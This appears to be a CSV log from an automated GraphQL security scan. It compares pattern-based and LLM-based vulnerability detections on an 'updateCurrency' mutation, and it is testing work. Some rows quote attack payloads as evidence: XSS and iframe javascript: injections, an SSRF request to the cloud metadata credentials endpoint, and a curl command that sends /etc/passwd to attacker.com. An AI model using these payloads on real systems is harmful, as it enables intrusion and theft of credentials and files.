timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-07T06:37:42.197634,updateCurrency_response_2,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:37:59.265624,updateCurrency_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored XSS payload (<img> tag with JavaScript execution via onerror attribute). If this value is rendered in a browser without sanitization, it would execute alert(document.cookie), indicating a lack of input sanitization/output encoding for user-controlled data in the GraphQL mutation response."", ""evidence"": ""<img src=x onerror=alert(document.cookie)> in the 'country' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""<img src=x onerror=alert(document.cookie)> in the 'country' field"", ""explanation"": ""The response contains a stored XSS payload (<img> tag with JavaScript execution via onerror attribute). If this value is rendered in a browser without sanitization, it would execute alert(document.cookie), indicating a lack of input sanitization/output encoding for user-controlled data in the GraphQL mutation response.""}}]"
2025-10-07T06:38:13.574207,updateCurrency_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a reference to AWS EC2 metadata endpoint (169.254.169.254), which is a common SSRF attack vector. This indicates the server may be processing user-controlled URLs to access internal network resources. Successful exploitation could allow attackers to retrieve cloud metadata credentials or probe internal services."", ""evidence"": ""Internal metadata endpoint 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' in 'country' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Internal metadata endpoint 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' in 'country' field"", ""explanation"": ""The response contains a reference to AWS EC2 metadata endpoint (169.254.169.254), which is a common SSRF attack vector. This indicates the server may be processing user-controlled URLs to access internal network resources. Successful exploitation could allow attackers to retrieve cloud metadata credentials or probe internal services.""}}]"
2025-10-07T06:38:20.959231,updateCurrency_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a command injection payload in the 'symbol' field: $(curl ... $(cat /etc/passwd)). This demonstrates an attempt to execute shell commands (curl and cat /etc/passwd) via command substitution syntax ($(...)), indicating potential OS command injection if the server improperly processes user input in GraphQL operations. The payload attempts to exfiltrate sensitive system files (/etc/passwd) to an external domain, characteristic of command injection attacks."", ""evidence"": ""symbol: \""$(curl http://attacker.com/?exfil=$(cat /etc/passwd))\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""symbol: \""$(curl http://attacker.com/?exfil=$(cat /etc/passwd))\"""", ""explanation"": ""The response contains a command injection payload in the 'symbol' field: $(curl ... $(cat /etc/passwd)). This demonstrates an attempt to execute shell commands (curl and cat /etc/passwd) via command substitution syntax ($(...)), indicating potential OS command injection if the server improperly processes user input in GraphQL operations. The payload attempts to exfiltrate sensitive system files (/etc/passwd) to an external domain, characteristic of command injection attacks.""}}]"
2025-10-07T06:38:28.761672,updateCurrency_response_6,200,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:39:00.914529,updateCurrency_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: html_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The GraphQL response returns unsanitized user-controlled HTML content in the 'country' field. The presence of an embedded <iframe> tag with a JavaScript URI demonstrates HTML injection, as raw HTML markup is stored and reflected without proper encoding. This could enable attackers to manipulate page content, though actual script execution might depend on client-side rendering contexts."", ""evidence"": ""<iframe src='javascript:alert(document.domain)'> in 'country' field"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""html_injection"", ""severity"": ""HIGH"", ""confidence"": 0.9, ""evidence"": ""<iframe src='javascript:alert(document.domain)'> in 'country' field"", ""explanation"": ""The GraphQL response returns unsanitized user-controlled HTML content in the 'country' field. The presence of an embedded <iframe> tag with a JavaScript URI demonstrates HTML injection, as raw HTML markup is stored and reflected without proper encoding. This could enable attackers to manipulate page content, though actual script execution might depend on client-side rendering contexts.""}}]"
2025-10-07T06:39:09.628240,updateCurrency_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:39:17.701453,updateCurrency_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:39:27.196071,updateCurrency_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-07T06:39:32.512994,updateCurrency_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Injection Attacks,1,0,0,0,1,0,0.0,llm_potential_only,,,Injection Attacks,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: Information Disclosure"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""The server's detailed error messages reveal field/argument suggestions when invalid inputs are provided. This exposes schema structure through typo corrections ('currencID' \u2192 'currencyID', 'contry' \u2192 'country', 'symb0l' \u2192 'symbol'), enabling attackers to probe for valid fields and arguments. While not directly exposing data, it facilitates reconnaissance for potential attacks by leaking schema information that should remain hidden."", ""evidence"": ""Multiple 'Did you mean' suggestions in error messages (e.g., 'currencyID', 'country', 'symbol')"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Information Disclosure"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Multiple 'Did you mean' suggestions in error messages (e.g., 'currencyID', 'country', 'symbol')"", ""explanation"": ""The server's detailed error messages reveal field/argument suggestions when invalid inputs are provided. This exposes schema structure through typo corrections ('currencID' \u2192 'currencyID', 'contry' \u2192 'country', 'symb0l' \u2192 'symbol'), enabling attackers to probe for valid fields and arguments. While not directly exposing data, it facilitates reconnaissance for potential attacks by leaking schema information that should remain hidden.""}}]"
